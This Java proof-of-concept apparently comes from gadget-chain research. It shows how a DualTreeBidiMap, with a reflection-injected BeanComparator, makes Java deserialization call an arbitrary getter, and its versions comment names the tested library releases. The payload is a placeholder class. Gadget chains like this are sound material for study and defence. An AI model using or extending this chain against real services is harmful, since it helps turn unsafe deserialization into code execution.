package com.xiinnn.readobject2getter;

import com.xiinnn.template.GetterClass;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.collections.bidimap.AbstractDualBidiMap;
import org.apache.commons.collections.bidimap.DualTreeBidiMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

// DualTreeBidiMap#readObject -> getter
// 实测：jdk8u192 commons-collections#3.2.2 commons-beanutils#1.9.3
public class DualTreeBidiMapReadObject2Getter {
    public static void main(String[] args) throws Exception{
        GetterClass getterClass = new GetterClass();
        HashMap<Object, Object> map = new HashMap<>();
        map.put(getterClass, getterClass);

        BeanComparator beanComparator = new BeanComparator("name", String.CASE_INSENSITIVE_ORDER);
        DualTreeBidiMap dualTreeBidiMap = new DualTreeBidiMap();
        setFieldValue(dualTreeBidiMap, "comparator", beanComparator);

        Field field = AbstractDualBidiMap.class.getDeclaredField("maps");
        field.setAccessible(true);
        Map[] maps = (Map[]) field.get(dualTreeBidiMap);
        maps[0] = map;

        byte[] code = serialize(dualTreeBidiMap);
        unserialize(code);
    }

    private static void setFieldValue(Object obj, String field, Object arg) throws Exception{
        Field f = obj.getClass().getDeclaredField(field);
        f.setAccessible(true);
        f.set(obj, arg);
    }
    public static byte[] serialize(Object obj) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        return baos.toByteArray();
    }
    public static void unserialize(byte[] bytes) throws IOException, ClassNotFoundException {
        ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
    }
}
